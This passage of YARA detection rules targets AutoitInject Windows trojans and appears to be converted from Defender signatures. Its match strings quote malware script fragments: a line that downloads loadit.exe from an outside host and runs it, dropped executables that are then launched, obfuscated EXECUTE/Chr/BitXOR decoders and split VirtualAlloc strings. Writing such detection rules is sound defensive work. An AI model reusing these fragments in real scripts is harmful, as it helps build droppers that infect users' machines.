        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "7"
        strings_accuracy = "High"
    strings:
        $x_1_1 = " INETREAD ( \"htttp://Vm6J7PQC.net\" , 544 , 9807 , 6418 )" ascii //weight: 1
        $x_1_2 = " PING ( \"htttp://yIGjx2Nw.io\" , 7341 , 3375 )" ascii //weight: 1
        $x_1_3 = " FILEDELETE ( @SCRIPTFULLPATH & \"\\Compliance\\reboot_log.dat\" )" ascii //weight: 1
        $x_1_4 = " @DESKTOPDIR & \"\\Info\\ Encrypted Logs\\step_by_step_image.gif\" )" ascii //weight: 1
        $x_1_5 = " REGDELETE ( \"HKCU\\Control Panel\\Mouse\" , \"SKTpmLKJqmKaMtlBXf\" )" ascii //weight: 1
        $x_1_6 = " FILEDELETE ( @PROGRAMFILESDIR & \"\\Debugging\\system_inspection_log.ini\" )" ascii //weight: 1
        $x_1_7 = " FILEWRITELINE ( 1577 , \"T2AvPyPKhI2\" )" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_AG_2147931123_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.AG!MTB"
        threat_id = "2147931123"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "7"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "HOTKEYSET ( \"{F5}\" , \"r71W4lZeAaJm\" )" ascii //weight: 1
        $x_1_2 = "ADLIBUNREGISTER ( \"wWjjeNVAVo4ChEjLZ2rF\" )" ascii //weight: 1
        $x_1_3 = "REGDELETE ( \"HKCU\\Software\" , \"xGK\" )" ascii //weight: 1
        $x_1_4 = "REGDELETE ( \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" , \"fjRmvM\" )" ascii //weight: 1
        $x_1_5 = "PING ( \"htttp://cK0Pqjnal.io\" , 6063 , 4713 )" ascii //weight: 1
        $x_1_6 = "DIRMOVE ( @HOMEPATH & \"\\Info\" , @TEMPDIR & \"\\Decryption\\App Data\" , 2047 )" ascii //weight: 1
        $x_1_7 = "REGDELETE ( \"HKCU\\Software\" , \"aH1EMwy0l7yRwo\" )" ascii //weight: 1
        $x_1_8 = "ADLIBREGISTER ( \"umzPcc2VqsXuH6UV\" , 6915 )" ascii //weight: 1
        $x_1_9 = "HOTKEYSET ( \"pNgi\" , \"XI\" )" ascii //weight: 1
        $x_1_10 = "PING ( \"htttp://Q7qC5l1GX.com\" , 5441 , 8308 )" ascii //weight: 1
        $x_1_11 = "FILEWRITELINE ( 1813 , \"Rhc56z2fVEd\" )" ascii //weight: 1
        $x_1_12 = "REGDELETE ( \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\" , \"9qZf\" )" ascii //weight: 1
        $x_1_13 = "INETREAD ( \"htttp://zuEGdOV57.net\" , 4634 , 663 , 4407 )" ascii //weight: 1
        $x_1_14 = "WINWAITACTIVE ( \"HgmwoKhe6c - LumenDrive\" , \"ipW2\" , 7575 )" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (7 of ($x*))
}

rule Trojan_Win32_AutoitInject_AH_2147931329_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.AH!MTB"
        threat_id = "2147931329"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {45 00 58 00 45 00 43 00 55 00 54 00 45 00 20 00 28 00 20 00 22 00 43 00 22 00 20 00 26 00 20 00 22 00 68 00 72 00 28 00 41 00 22 00 20 00 26 00 20 00 22 00 73 00 63 00 28 00 [0-31] 28 00 22 00 20 00 26 00 20 00 22 00 24 00 [0-31] 2c 00 20 00 24 00 [0-31] 2c 00 20 00 31 00 29 00 29 00 20 00 2d 00 20 00 4d 00 6f 00 64 00 28 00 24 00 [0-31] 20 00 2b 00 20 00 24 00 [0-31] 2c 00 20 00 32 00 35 00 36 00 29 00 29 00 22 00 20 00 29 00}  //weight: 2, accuracy: Low
        $x_2_2 = {45 58 45 43 55 54 45 20 28 20 22 43 22 20 26 20 22 68 72 28 41 22 20 26 20 22 73 63 28 [0-31] 28 22 20 26 20 22 24 [0-31] 2c 20 24 [0-31] 2c 20 31 29 29 20 2d 20 4d 6f 64 28 24 [0-31] 20 2b 20 24 [0-31] 2c 20 32 35 36 29 29 22 20 29}  //weight: 2, accuracy: Low
        $x_1_3 = {46 00 49 00 4c 00 45 00 53 00 45 00 4c 00 45 00 43 00 54 00 46 00 4f 00 4c 00 44 00 45 00 52 00 20 00 28 00 20 00 24 00 [0-31] 20 00 2c 00 20 00 22 00 71 00 61 00 4d 00 64 00 53 00 47 00 48 00 7a 00 4f 00 77 00 6b 00 4e 00 76 00 22 00 20 00 2c 00 20 00 39 00 38 00 35 00 38 00 20 00 2c 00 20 00 22 00 70 00 77 00 6d 00 73 00 4b 00 74 00 67 00 52 00 49 00 35 00 41 00 58 00 45 00 62 00 58 00 75 00 65 00 69 00 64 00 22 00 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_4 = {46 49 4c 45 53 45 4c 45 43 54 46 4f 4c 44 45 52 20 28 20 24 [0-31] 20 2c 20 22 71 61 4d 64 53 47 48 7a 4f 77 6b 4e 76 22 20 2c 20 39 38 35 38 20 2c 20 22 70 77 6d 73 4b 74 67 52 49 35 41 58 45 62 58 75 65 69 64 22 20 29}  //weight: 1, accuracy: Low
        $x_1_5 = "PING ( \"htttp://ilgXbtc9tZ.io\" , 7368 , 5328 )" ascii //weight: 1
        $x_1_6 = "WINGETHANDLE ( \"gFVQXm - MatrixFlow\" , \"6jGAaMyK\" )" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_2_*) and 3 of ($x_1_*))) or
            ((2 of ($x_2_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win32_AutoitInject_HNP_2147931549_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.HNP!MTB"
        threat_id = "2147931549"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {26 00 3d 00 20 00 45 00 58 00 45 00 43 00 55 00 54 00 45 00 20 00 28 00 20 00 22 00 43 00 22 00 20 00 26 00 20 00 22 00 68 00 72 00 28 00 41 00 22 00 20 00 26 00 20 00 22 00 73 00 63 00 28 00 [0-32] 28 00 22 00 20 00 26 00 20 00 22 00}  //weight: 1, accuracy: Low
        $x_1_2 = {26 3d 20 45 58 45 43 55 54 45 20 28 20 22 43 22 20 26 20 22 68 72 28 41 22 20 26 20 22 73 63 28 [0-32] 28 22 20 26 20 22}  //weight: 1, accuracy: Low
        $x_1_3 = {26 00 3d 00 20 00 45 00 58 00 45 00 43 00 55 00 54 00 45 00 20 00 28 00 20 00 22 00 43 00 22 00 20 00 26 00 20 00 22 00 68 00 22 00 20 00 26 00 20 00 22 00 72 00 28 00 41 00 22 00 20 00 26 00 20 00 22 00 73 00 63 00 28 00 [0-32] 28 00 22 00 20 00 26 00 20 00 22 00}  //weight: 1, accuracy: Low
        $x_1_4 = {26 3d 20 45 58 45 43 55 54 45 20 28 20 22 43 22 20 26 20 22 68 22 20 26 20 22 72 28 41 22 20 26 20 22 73 63 28 [0-32] 28 22 20 26 20 22}  //weight: 1, accuracy: Low
        $x_1_5 = {26 00 3d 00 20 00 45 00 58 00 45 00 43 00 55 00 54 00 45 00 20 00 28 00 20 00 22 00 43 00 22 00 20 00 26 00 20 00 22 00 68 00 22 00 20 00 26 00 20 00 22 00 72 00 28 00 41 00 22 00 20 00 26 00 20 00 22 00 73 00 22 00 20 00 26 00 20 00 22 00 63 00 28 00 [0-32] 28 00 22 00 20 00 26 00 20 00 22 00}  //weight: 1, accuracy: Low
        $x_1_6 = {26 3d 20 45 58 45 43 55 54 45 20 28 20 22 43 22 20 26 20 22 68 22 20 26 20 22 72 28 41 22 20 26 20 22 73 22 20 26 20 22 63 28 [0-32] 28 22 20 26 20 22}  //weight: 1, accuracy: Low
        $x_1_7 = {26 00 3d 00 20 00 45 00 58 00 45 00 43 00 55 00 54 00 45 00 20 00 28 00 20 00 22 00 43 00 22 00 20 00 26 00 20 00 22 00 68 00 72 00 28 00 41 00 22 00 20 00 26 00 20 00 22 00 73 00 22 00 20 00 26 00 20 00 22 00 63 00 28 00 [0-32] 28 00 22 00 20 00 26 00 20 00 22 00}  //weight: 1, accuracy: Low
        $x_1_8 = {26 3d 20 45 58 45 43 55 54 45 20 28 20 22 43 22 20 26 20 22 68 72 28 41 22 20 26 20 22 73 22 20 26 20 22 63 28 [0-32] 28 22 20 26 20 22}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule Trojan_Win32_AutoitInject_AI_2147931966_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.AI!MTB"
        threat_id = "2147931966"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "HOTKEYSET ( \"Wf4YRwW8mqpUrmdw\" , \"veN2rm\" )" ascii //weight: 1
        $x_1_2 = "PING ( \"htttp://bRsE69c.net\" , 3266 , 2533 )" ascii //weight: 1
        $x_1_3 = "FILEDELETE ( @TEMPDIR & \"\\ Admin Tools\\brand_partner_photo.bmp\" )" ascii //weight: 1
        $x_1_4 = "REGDELETE ( \"HKCU\\Control Panel\\Desktop\" , \"Eeu9Wi62YDhTI4iJ\" )" ascii //weight: 1
        $x_1_5 = "FILEINSTALL ( \"bankrupture\" , @TEMPDIR & \"\\bankrupture\" , 1 )" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_HNQ_2147932010_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.HNQ!MTB"
        threat_id = "2147932010"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "41"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {57 00 49 00 4e 00 57 00 41 00 49 00 54 00 41 00 43 00 54 00 49 00 56 00 45 00 20 00 28 00 20 00 22 00 [0-64] 45 00 64 00 69 00 74 00 6f 00 72 00 22 00 20 00 2c 00 20 00 [0-64] 20 00 2c 00 20 00 [0-16] 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_2 = {57 49 4e 57 41 49 54 41 43 54 49 56 45 20 28 20 22 [0-64] 45 64 69 74 6f 72 22 20 2c 20 [0-64] 20 2c 20 [0-16] 20 29}  //weight: 1, accuracy: Low
        $x_1_3 = {57 00 49 00 4e 00 57 00 41 00 49 00 54 00 41 00 43 00 54 00 49 00 56 00 45 00 20 00 28 00 20 00 22 00 [0-64] 4d 00 61 00 69 00 6c 00 22 00 20 00 2c 00 20 00 [0-64] 20 00 2c 00 20 00 [0-16] 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_4 = {57 49 4e 57 41 49 54 41 43 54 49 56 45 20 28 20 22 [0-64] 4d 61 69 6c 22 20 2c 20 [0-64] 20 2c 20 [0-16] 20 29}  //weight: 1, accuracy: Low
        $x_1_5 = {57 00 49 00 4e 00 53 00 45 00 54 00 4f 00 4e 00 54 00 4f 00 50 00 20 00 28 00 20 00 22 00 [0-64] 45 00 64 00 69 00 74 00 6f 00 72 00 22 00 20 00 2c 00 20 00 [0-64] 20 00 2c 00 20 00 [0-16] 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_6 = {57 49 4e 53 45 54 4f 4e 54 4f 50 20 28 20 22 [0-64] 45 64 69 74 6f 72 22 20 2c 20 [0-64] 20 2c 20 [0-16] 20 29}  //weight: 1, accuracy: Low
        $x_1_7 = {57 00 49 00 4e 00 53 00 45 00 54 00 4f 00 4e 00 54 00 4f 00 50 00 20 00 28 00 20 00 22 00 [0-64] 4d 00 61 00 69 00 6c 00 22 00 20 00 2c 00 20 00 [0-64] 20 00 2c 00 20 00 [0-16] 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_8 = {57 49 4e 53 45 54 4f 4e 54 4f 50 20 28 20 22 [0-64] 4d 61 69 6c 22 20 2c 20 [0-64] 20 2c 20 [0-16] 20 29}  //weight: 1, accuracy: Low
        $x_1_9 = {57 00 49 00 4e 00 53 00 45 00 54 00 54 00 49 00 54 00 4c 00 45 00 20 00 28 00 20 00 22 00 [0-64] 45 00 64 00 69 00 74 00 6f 00 72 00 22 00 20 00 2c 00 20 00}  //weight: 1, accuracy: Low
        $x_1_10 = {57 49 4e 53 45 54 54 49 54 4c 45 20 28 20 22 [0-64] 45 64 69 74 6f 72 22 20 2c 20}  //weight: 1, accuracy: Low
        $x_10_11 = {50 00 49 00 4e 00 47 00 20 00 28 00 20 00 22 00 68 00 74 00 74 00 74 00 70 00 3a 00 2f 00 2f 00 [0-64] 2e 00 [0-16] 22 00 20 00 2c 00 20 00 [0-16] 20 00 2c 00 20 00 [0-16] 20 00 29 00}  //weight: 10, accuracy: Low
        $x_10_12 = {50 49 4e 47 20 28 20 22 68 74 74 74 70 3a 2f 2f [0-64] 2e [0-16] 22 20 2c 20 [0-16] 20 2c 20 [0-16] 20 29}  //weight: 10, accuracy: Low
        $x_10_13 = {50 00 52 00 4f 00 43 00 45 00 53 00 53 00 43 00 4c 00 4f 00 53 00 45 00 20 00 28 00 20 00 22 00 [0-64] 2e 00 65 00 78 00 65 00 22 00 20 00 29 00}  //weight: 10, accuracy: Low
        $x_10_14 = {50 52 4f 43 45 53 53 43 4c 4f 53 45 20 28 20 22 [0-64] 2e 65 78 65 22 20 29}  //weight: 10, accuracy: Low
        $x_10_15 = {50 00 52 00 4f 00 43 00 45 00 53 00 53 00 57 00 41 00 49 00 54 00 20 00 28 00 20 00 22 00 [0-64] 2e 00 65 00 78 00 65 00 22 00 20 00 2c 00 20 00}  //weight: 10, accuracy: Low
        $x_10_16 = {50 52 4f 43 45 53 53 57 41 49 54 20 28 20 22 [0-64] 2e 65 78 65 22 20 2c 20}  //weight: 10, accuracy: Low
        $x_10_17 = "GUICTRLSETDATA (" ascii //weight: 10
    condition:
        (filesize < 20MB) and
        (
            ((4 of ($x_10_*) and 1 of ($x_1_*))) or
            ((5 of ($x_10_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win32_AutoitInject_HNQ_2147932010_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.HNQ!MTB"
        threat_id = "2147932010"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {26 00 3d 00 20 00 45 00 58 00 45 00 43 00 55 00 54 00 45 00 20 00 28 00 20 00 22 00 43 00 22 00 20 00 26 00 20 00 22 00 68 00 72 00 28 00 41 00 22 00 20 00 26 00 20 00 22 00 73 00 63 00 28 00 [0-32] 28 00 22 00 20 00 26 00 20 00 22 00}  //weight: 1, accuracy: Low
        $x_1_2 = {26 3d 20 45 58 45 43 55 54 45 20 28 20 22 43 22 20 26 20 22 68 72 28 41 22 20 26 20 22 73 63 28 [0-32] 28 22 20 26 20 22}  //weight: 1, accuracy: Low
        $x_1_3 = {26 00 3d 00 20 00 45 00 58 00 45 00 43 00 55 00 54 00 45 00 20 00 28 00 20 00 22 00 43 00 22 00 20 00 26 00 20 00 22 00 68 00 22 00 20 00 26 00 20 00 22 00 72 00 28 00 41 00 22 00 20 00 26 00 20 00 22 00 73 00 63 00 28 00 [0-32] 28 00 22 00 20 00 26 00 20 00 22 00}  //weight: 1, accuracy: Low
        $x_1_4 = {26 3d 20 45 58 45 43 55 54 45 20 28 20 22 43 22 20 26 20 22 68 22 20 26 20 22 72 28 41 22 20 26 20 22 73 63 28 [0-32] 28 22 20 26 20 22}  //weight: 1, accuracy: Low
        $x_1_5 = {26 00 3d 00 20 00 45 00 58 00 45 00 43 00 55 00 54 00 45 00 20 00 28 00 20 00 22 00 43 00 22 00 20 00 26 00 20 00 22 00 68 00 22 00 20 00 26 00 20 00 22 00 72 00 28 00 41 00 22 00 20 00 26 00 20 00 22 00 73 00 22 00 20 00 26 00 20 00 22 00 63 00 28 00 [0-32] 28 00 22 00 20 00 26 00 20 00 22 00}  //weight: 1, accuracy: Low
        $x_1_6 = {26 3d 20 45 58 45 43 55 54 45 20 28 20 22 43 22 20 26 20 22 68 22 20 26 20 22 72 28 41 22 20 26 20 22 73 22 20 26 20 22 63 28 [0-32] 28 22 20 26 20 22}  //weight: 1, accuracy: Low
        $x_1_7 = {26 00 3d 00 20 00 45 00 58 00 45 00 43 00 55 00 54 00 45 00 20 00 28 00 20 00 22 00 43 00 22 00 20 00 26 00 20 00 22 00 68 00 72 00 28 00 41 00 22 00 20 00 26 00 20 00 22 00 73 00 22 00 20 00 26 00 20 00 22 00 63 00 28 00 [0-32] 28 00 22 00 20 00 26 00 20 00 22 00}  //weight: 1, accuracy: Low
        $x_1_8 = {26 3d 20 45 58 45 43 55 54 45 20 28 20 22 43 22 20 26 20 22 68 72 28 41 22 20 26 20 22 73 22 20 26 20 22 63 28 [0-32] 28 22 20 26 20 22}  //weight: 1, accuracy: Low
        $x_1_9 = "HOTKEYSET ( \"{ENTER}\" , \"GQJymPLyV7m49jD4PRz\" )" ascii //weight: 1
        $x_1_10 = "REGDELETE ( \"HKCU\\Software\" , \"TMe75Uy8BUl3r\" )" ascii //weight: 1
        $x_1_11 = "REGDELETE ( \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\" , \"mERzN1o\" )" ascii //weight: 1
        $x_1_12 = "REGREAD ( \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" , \"7\" )" ascii //weight: 1
        $x_1_13 = "INETREAD ( \"htttp://xbObbsDr.org\" , 5342 , 5247 , 591 )" ascii //weight: 1
        $x_1_14 = "DIRMOVE ( @MYDOCUMENTSDIR & \"\\ Dump Logs\" , @APPDATADIR & \"\\Shutdown\" , 1236 )" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (7 of ($x*))
}

rule Trojan_Win32_AutoitInject_HNR_2147932481_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.HNR!MTB"
        threat_id = "2147932481"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "52"
        strings_accuracy = "Low"
    strings:
        $x_10_1 = {53 00 54 00 52 00 49 00 4e 00 47 00 46 00 4f 00 52 00 4d 00 41 00 54 00 20 00 28 00 20 00 [0-48] 20 00 28 00 20 00 22 00 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 02}  //weight: 10, accuracy: Low
        $x_10_2 = {53 54 52 49 4e 47 46 4f 52 4d 41 54 20 28 20 [0-48] 20 28 20 22 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 02}  //weight: 10, accuracy: Low
        $x_10_3 = "RETURN SETERROR ( 5 , 0 , \"\" )" ascii //weight: 10
        $x_10_4 = "RETURN SETERROR ( + -1 , 0 , \"\" )" ascii //weight: 10
        $x_10_5 = "= GUICTRLCREATEEDIT ( \"\" , 4 , 4 , $" ascii //weight: 10
        $x_10_6 = " + -8 , BITOR ( $" ascii //weight: 10
        $x_1_7 = "&= CHR ( BITXOR ( $" ascii //weight: 1
        $x_1_8 = {4c 00 4f 00 43 00 41 00 4c 00 20 00 24 00 [0-32] 20 00 3d 00 20 00 22 00 22 00 [0-38] 41 00 4c 00 20 00 24 00 [0-32] 20 00 3d 00 20 00 53 00 54 00 52 00 49 00 4e 00 47 00 53 00 50 00 4c 00 49 00 54 00 20 00 28 00 20 00 24 00 [0-64] 2c 00 20 00 31 00 20 00 29 00 [0-40] 59 00 20 00 28 00 20 00 24 00 02 20 00 29 00 20 00 54 00 48 00 45 00 4e 00 [0-10] 52 00 20 00 24 00 [0-32] 20 00 3d 00 20 00 31 00 20 00 54 00 4f 00 20 00 24 00 02 20 00 5b 00 20 00 30 00 20 00 5d 00 [0-6] 24 00 00 20 00 26 00 3d 00 20 00 43 00 48 00 52 00 20 00 28 00 20 00 42 00 49 00 54 00 58 00 4f 00 52 00 20 00 28 00 20 00 24 00 02 20 00 5b 00 20 00 24 00 07 [0-136] 54 00 [0-22] 4e 00 20 00 28 00 20 00 24 00 00 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_9 = {4c 4f 43 41 4c 20 24 [0-32] 20 3d 20 22 22 [0-38] 41 4c 20 24 [0-32] 20 3d 20 53 54 52 49 4e 47 53 50 4c 49 54 20 28 20 24 [0-64] 2c 20 31 20 29 [0-40] 59 20 28 20 24 02 20 29 20 54 48 45 4e [0-10] 52 20 24 [0-32] 20 3d 20 31 20 54 4f 20 24 02 20 5b 20 30 20 5d [0-6] 24 00 20 26 3d 20 43 48 52 20 28 20 42 49 54 58 4f 52 20 28 20 24 02 20 5b 20 24 07 [0-136] 54 [0-22] 4e 20 28 20 24 00 20 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((5 of ($x_10_*) and 2 of ($x_1_*))) or
            ((6 of ($x_10_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win32_AutoitInject_AELA_2147933400_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.AELA!MTB"
        threat_id = "2147933400"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "7"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "@TEMPDIR &" ascii //weight: 1
        $x_2_2 = "k528210520er528210520nel35282105202" ascii //weight: 2
        $x_2_3 = "528210520V528210520ir528210520tualA528210520llo528210520c" ascii //weight: 2
        $x_2_4 = "u528210520s528210520er32528210520.528210520d528210520l528210520l" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_AMLA_2147933550_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.AMLA!MTB"
        threat_id = "2147933550"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "12"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "&= CHR ( RANDOM ( 97 , 122 , 1 ) )" ascii //weight: 1
        $x_2_2 = "FILEINSTALL ( \"1785331143.exe\" , @TEMPDIR & \"\\\" & $STEXT & \".exe\" )" ascii //weight: 2
        $x_2_3 = "RUN ( @TEMPDIR & \"\\\" & $STEXT & \".exe\" &" ascii //weight: 2
        $x_2_4 = "\" -p1084096662501417456140641448427826439223939580528204145012403150328373128753202032654274781517727461304914650855920502\" )" ascii //weight: 2
        $x_1_5 = "SLEEP ( 120000 )" ascii //weight: 1
        $x_2_6 = "FILEDELETE ( @TEMPDIR & \"\\\" & $STEXT & \".exe\" )" ascii //weight: 2
        $x_2_7 = "FILEDELETE ( @TEMPDIR & \"\\\" & \"Rar*\" )" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_ARLA_2147933688_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.ARLA!MTB"
        threat_id = "2147933688"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "9"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "FILEINSTALL ( \"C:\\penis.mpg\" , @TEMPDIR & \"\\\" & \"penis.mpg\" , 0 )" ascii //weight: 1
        $x_2_2 = "SHELLEXECUTE ( @TEMPDIR & \"\\\" & \"penis.mpg\" )" ascii //weight: 2
        $x_2_3 = "SLEEP ( 300000 )" ascii //weight: 2
        $x_2_4 = "INETGET ( \"http://gema123.ge.ohost.de/loadit.exe\" , @APPDATADIR & \"\\loadit.exe\" , 1 , 0 )" ascii //weight: 2
        $x_2_5 = "RUN ( @APPDATADIR & \"\\\" & \"loadit.exe\" , \"\" , \"\" )" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_AXLA_2147933903_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.AXLA!MTB"
        threat_id = "2147933903"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "8"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "EXECUTE ( \"A\" & \"sc\" )" ascii //weight: 1
        $x_1_2 = "EXECUTE ( \"C\" & \"hr\" )" ascii //weight: 1
        $x_2_3 = {46 00 49 00 4c 00 45 00 49 00 4e 00 53 00 54 00 41 00 4c 00 4c 00 20 00 28 00 20 00 22 00 [0-20] 22 00 20 00 2c 00 20 00 40 00 54 00 45 00 4d 00 50 00 44 00 49 00 52 00 20 00 26 00 20 00 22 00 5c 00 [0-20] 22 00 20 00 2c 00 20 00 31 00 20 00 29 00}  //weight: 2, accuracy: Low
        $x_2_4 = {46 49 4c 45 49 4e 53 54 41 4c 4c 20 28 20 22 [0-20] 22 20 2c 20 40 54 45 4d 50 44 49 52 20 26 20 22 5c [0-20] 22 20 2c 20 31 20 29}  //weight: 2, accuracy: Low
        $x_2_5 = {28 00 20 00 22 00 77 00 6c 00 61 00 70 00 35 00 4e 00 22 00 20 00 29 00 20 00 26 00 20 00 24 00 [0-20] 20 00 28 00 20 00 24 00 [0-20] 20 00 29 00 20 00 26 00 20 00 [0-20] 20 00 28 00 20 00 22 00 48 00 22 00 20 00 29 00 20 00 2c 00}  //weight: 2, accuracy: Low
        $x_2_6 = {28 20 22 77 6c 61 70 35 4e 22 20 29 20 26 20 24 [0-20] 20 28 20 24 [0-20] 20 29 20 26 20 [0-20] 20 28 20 22 48 22 20 29 20 2c}  //weight: 2, accuracy: Low
        $x_2_7 = {28 00 20 00 22 00 71 00 62 00 7a 00 67 00 71 00 22 00 20 00 29 00 20 00 2c 00 20 00 22 00 30 00 78 00 33 00 30 00 30 00 30 00 22 00 20 00 2c 00 20 00 [0-20] 20 00 28 00 20 00 22 00 71 00 62 00 7a 00 67 00 71 00 22 00 20 00 29 00 20 00 2c 00 20 00 22 00 30 00 78 00 34 00 30 00 22 00 20 00 29 00 20 00 5b 00 20 00 30 00 20 00 5d 00}  //weight: 2, accuracy: Low
        $x_2_8 = {28 20 22 71 62 7a 67 71 22 20 29 20 2c 20 22 30 78 33 30 30 30 22 20 2c 20 [0-20] 20 28 20 22 71 62 7a 67 71 22 20 29 20 2c 20 22 30 78 34 30 22 20 29 20 5b 20 30 20 5d}  //weight: 2, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((3 of ($x_2_*) and 2 of ($x_1_*))) or
            ((4 of ($x_2_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win32_AutoitInject_HHA_2147935169_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.HHA!MTB"
        threat_id = "2147935169"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "14"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "FILEINSTALL" ascii //weight: 1
        $x_1_2 = "@TEMPDIR" ascii //weight: 1
